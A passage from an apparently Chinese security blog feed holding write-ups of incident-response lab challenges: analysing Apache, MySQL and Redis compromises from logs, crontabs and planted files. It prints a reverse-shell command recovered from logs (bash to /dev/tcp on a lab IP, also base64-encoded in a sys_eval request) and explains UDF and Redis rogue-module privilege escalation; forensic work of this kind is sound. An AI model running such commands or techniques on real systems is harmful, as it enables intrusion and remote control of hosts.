class="hljs-string">&quot;static/&quot;</span>, follow_symlinks=<span class="hljs-title class_">True</span>),  # <span class="hljs-title class_">Remove</span> follow_symlinks to avoid the vulnerability<br>])<br></code></pre></td></tr></table></figure><p>里面的 <code>follow_symlinks=True</code> 会导致目录遍历产生任意文件读取</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第二章</title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>apache 日志分析 &amp; mysql 应急响应 &amp; redis 应急响应</p><span id="more"></span><h1 id="apache-日志分析"><a href="#apache-日志分析" class="headerlink" title="apache 日志分析"></a>apache 日志分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号密码 root apacherizhi<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>、提交当天访问次数最多的<span class="hljs-built_in">IP</span>，即黑客<span class="hljs-built_in">IP</span>：<br><span class="hljs-number">2</span>、黑客使用的浏览器指纹是什么，提交指纹的md5：<br><span class="hljs-number">3</span>、查看包含index<span class="hljs-number">.</span>php页面被访问的次数，提交次数：<br><span class="hljs-number">4</span>、查看黑客<span class="hljs-built_in">IP</span>访问了多少次，提交次数：<br><span class="hljs-number">5</span>、查看<span class="hljs-number">2023</span>年<span class="hljs-number">8</span>月<span class="hljs-number">03</span>日<span class="hljs-number">8</span>时这一个小时内有多少<span class="hljs-built_in">IP</span>访问，提交次数:<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>在 apache2 日志中过滤出访问次数最多的 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1 | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn<br><br><span class="hljs-comment"># cut:从每行中提取指定字段</span><br><span class="hljs-comment"># -d-:指定分隔符为 -</span><br><span class="hljs-comment"># -f 1:指定要提取第一个字段</span><br><span class="hljs-comment"># uniq -c:删除重复的行，只统计唯一出现的次数</span><br><span class="hljs-comment"># sort:对输出内容排序</span><br><span class="hljs-comment"># -r:按照降序排列</span><br><span class="hljs-comment"># -n:按照数值大小排序</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/005c5ee5274ca0e8.png"></p><p>拿到 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>知道 IP 了，直接过滤出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/aa8d17cf8a9d9a44.png"></p><p>找到指纹</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span><br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2</span>d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>同理，过滤出 <code>index.php</code> 文件，<code>wc -l</code>列出次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">27</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>按照 IP  过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;192.168.200.2&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b7f23942d9639a77.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6555</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>按照时间过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5a6b47c2b00b4c78.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="mysql-应急响应"><a href="#mysql-应急响应" class="headerlink" title="mysql 应急响应"></a>mysql 应急响应</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mysql应急响应 ssh账号 root  密码 xjmysql<br>ssh env<span class="hljs-selector-class">.xj</span><span class="hljs-selector-class">.edisec</span><span class="hljs-selector-class">.net</span>  -<span class="hljs-selector-tag">p</span> xxxxx<br><span class="hljs-number">1</span>.黑客第一次写入的shell flag&#123;关键字符串&#125; <br><span class="hljs-number">2</span>.黑客反弹shell的ip flag&#123;ip&#125;<br><span class="hljs-number">3</span>.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx<span class="hljs-selector-class">.xx</span><br><span class="hljs-number">4</span>.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>写入的 shell 一般在 web 目录下，所以进入 <code>/var/www/html</code> 查看，查看可疑文件 <code>sh.php</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/7c6078e78f8d08c6.png"></p><p>找到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccfda79e-<span class="hljs-number">7</span>aa1-<span class="hljs-number">4275</span>-bc26-a6189eb9a20b&#125;<br></code></pre></td></tr></table></figure><p>而且可以发现注入点为数据库表的第三个字段</p><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>反弹 shell 可以看日志，进入 <code>/var/log</code> 目录下看日志，进入 <code>apache2</code> 查看 <code>access.log</code>，能看见如下一条日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">192.168.200.2 - - [01/Aug/2023:02:18:18 +0000] &quot;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B HTTP/1.1&quot; 200 4025 &quot;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;<br></code></pre></td></tr></table></figure><p>url 解码之后得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d&#x27;</span>);<br></code></pre></td></tr></table></figure><p>base64 解码得到反弹 shell 语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>能提权说明已经是连接上了，查找一下与账号有关的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7ecfaf23490aa467.png"></p><p>第一条显示了账号密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;334cc35b3c704593&quot;,&quot;cms&quot;,&quot;3306&quot;);<br></code></pre></td></tr></table></figure><p>直接连接上 mysql，查看是否为 UDF 提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;secure_file_priv&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/398721c2edc14fb8.png"></p><p><code>secure_file_priv</code> 为空，因为 <code>secure_file_priv</code> 决定了是否有上传文件等操作的权限，当 <code>secure_file_priv</code> 为空时其也就表示了可以对任意路径进行操作，并且是 root 账户，满足了 UDF 提权。</p><p>进入 <code>/usr/lib/mysql/plugin</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib/mysql/plugin<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d4aa08327ee675f.png"></p><p>发现了 <code>udf.so</code> 文件，md5 加密路径 <code>/usr/lib/mysql/plugin/udf.so</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;b1818bde4e310f3d23f1005<span class="hljs-number">185b973e7</span>&#125;<br></code></pre></td></tr></table></figure><p>UDF 提权详解：<a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】</a></p><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>查询数据库中有哪些函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a74176608947258f.png"></p><p>同样使用此函数执行 <code>whoami</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b692f5b8099f8b85.png"></p><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;mysql&#125;</span><br></code></pre></td></tr></table></figure><h1 id="redis-应急响应"><a href="#redis-应急响应" class="headerlink" title="redis 应急响应"></a>redis 应急响应</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs armasm">服务器场景操作系统 Linux<br>服务器账号密码 root xjredis<br><br>任务环境说明<br>    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！<br>    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查<br>    <br><span class="hljs-number">1</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客攻击成功的 <span class="hljs-built_in">IP</span> 为多少,将黑客 <span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客反弹 shell 的<span class="hljs-built_in">IP</span> 为多少,将反弹 shell 的<span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br><span class="hljs-number">5</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>进入 <code>/var/log</code> 目录查看日志信息 <code>redis.log</code></p><p>有三个 IP : 192.168.100.13，192.168.31.55 和 192.168.100.20</p><p>而 IP 192.168.100.13 进行了 <code>MASTER &lt;-&gt; REPLICA sync started</code> 主从复制攻击，但攻击失败</p><p><img src="https://img.dkdun.cn/v1/2025/12/3dc650c4f2f9fc84.png"></p><p>192.168.31.55 并没有明显的恶意行为</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>同样 192.168.100.20 也进行了攻击，并且成功了，还执行了恶意模块操作 <code>Module &#39;system&#39; loaded from ./exp.so</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.20</span>&#125;<br></code></pre></td></tr></table></figure><p>主从复制攻击，是指将一台 Redis 服务器的数据复制到其他的 Redis 服务器，攻击机为主机，被攻击的机器为从机，利用复制的功能通过 <code>FULLRESYNC</code> 将主机上的文件同步复制至从机上，然后再利用 <code>redis4.x/5.x</code> 指令可以通过外部加载的特性去加载恶意的 so 文件，从而实现利用 redis 完成提权</p><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>从前面已经知道了恶意 so 文件 <code>exp.so</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>从根目录找到 <code>exp.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings exp.so | grep <span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a9db1ef51d18e8ad.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;XJ_78f012d7-<span class="hljs-number">42</span>fc-<span class="hljs-number">49</span>a8-<span class="hljs-number">8</span>a8c-e74c87ea109b&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>查看 <code>syslog.1</code> 系统日志有一堆反弹 shell 的记录</p><p><img src="https://img.dkdun.cn/v1/2025/12/879b605608dcde37.png"></p><p>说明攻击者写了计划任务，IP 为 <code>192.168.100.20</code>，查看有无定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/546b6965a386a933.png"></p><p>定时任务中反弹 shell 的 IP 为 <code>192.168.100.13</code> </p><p>攻击机切换了好几次 IP，从 192.168.100.13:8888 切换到 192.168.31.55:8888，然后再切换到 192.168.100.20:8888，这里的 flag 只算定时任务的 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>一般 ssh 登录有两种：</p><p>用户生成一对 SSH 密钥对，包括私钥和公钥。公钥被上传并存储在目标服务器的用户账户下的 <code>~/.ssh/authorized_keys</code> 文件中</p><p>直接使用用户名和密码登录</p><p>那这里可以查看 Redis 配置或查看 SSH 登录日志</p><p>访问 <code>.ssh</code> 目录中的 <code>authorized_keys</code> 文件，包含了 redis 的公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">REDIS0009�      redis-ver5.0.1�<br>�edis-bits�@�ctime�tO�dused-mem�XU<br> aof-preamble���xxsshB9<br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user<br><br>�&lt;#5M<br></code></pre></td></tr></table></figure><p><code>xj-test-user</code> 是一个用户名，搜索找到了 <a href="https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636">https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7b8cae845bb7d611.png"></p><p>然后拼接</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>&#123;xj-test-user-wow-you-<span class="hljs-built_in">find</span>-<span class="hljs-built_in">flag</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>检查系统路径中的命令，在 <code>/usr/bin</code> 文件夹下查看</p><p><img src="https://img.dkdun.cn/v1/2025/12/cf508bd0ab1819a2.png"></p><p>发现 ps 的权限为 <code>-rwxrwxrwx</code>，正常权限应该为 <code>-rwxr-xr-x</code>，查看 ps 的内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc847e291fd31b47.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;c195i2923381905517d818e<span class="hljs-number">313792d196</span>&#125;<br></code></pre></td></tr></table></figure><p>简单分析一下这个脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/bin/bash</span><br>oldifs=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>IFS=<span class="hljs-string">&#x27;\$n&#x27;</span><br>result=$(ps_ <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span>|grep -v <span class="hljs-string">&#x27;threadd&#x27;</span> )<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$v</span>\t&quot;</span>;<br><span class="hljs-keyword">done</span><br>IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$oldifs</span>&quot;</span><br></code></pre></td></tr></table></figure><p>获取 <code>ps_</code> 命令的输出，并按行处理和输出结果，列出系统中运行的进程，并过滤掉包含 <code>threadd</code> 关键字的进程信息，应该是一个进程监控脚本，检查特定进程的状态</p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第一章</title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>webshell 查杀 &amp; Linux 日志分析 &amp; Linux 入侵排查</p><span id="more"></span><h1 id="查找-shell-方法"><a href="#查找-shell-方法" class="headerlink" title="查找 shell 方法"></a>查找 shell 方法</h1><p>查找有 Webshell 特征的文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.jsp&quot;</span> | xargs grep <span class="hljs-string">&quot;exec(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.asp&quot;</span> | xargs grep <span class="hljs-string">&quot;execute(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.aspx&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><p>对于免杀 Webshell，可以查看是否使用编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;base64_decode&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-日志分析"><a href="#Linux-日志分析" class="headerlink" title="Linux 日志分析"></a>Linux 日志分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号 root 密码 linuxrz<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>.有多少<span class="hljs-built_in">IP</span>在爆破主机ssh的root帐号，如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">2.</span>ssh爆破成功登陆的<span class="hljs-built_in">IP</span>是多少，如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">3</span>.爆破用户名字典是什么？如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">4</span>.登陆成功的<span class="hljs-built_in">IP</span>共爆破了多少次<br><span class="hljs-number">5</span>.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Linux 默认日志存放在 <code>/var/log</code> 目录下，所以直接进入</p><p><img src="https://img.dkdun.cn/v1/2025/12/76c546db2b1372b4.png"></p><p>发现有很多日志文件，<code>auth.log.1</code> 文件是一个非常重要的系统日志文件，包含了许多与安全相关的信息，可以用于监控、分析和排查系统故障和安全问题，所以我们可以查看它的内容信息，根据题目来看在爆破 root 账号，那么可以 <code>grep</code> 过滤一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/daa25390b87f2a2f.png"></p><p>找到三个 IP：192.168.200.32，192.168.200.2，192.168.200.31</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>,<span class="hljs-number">192.168.200.31</span>,<span class="hljs-number">192.168.200.32</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>需要查看成功登录的 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55b06204f84935bf.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>对登陆失败的用户名进行查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span><br></code></pre></td></tr></table></figure><p><img 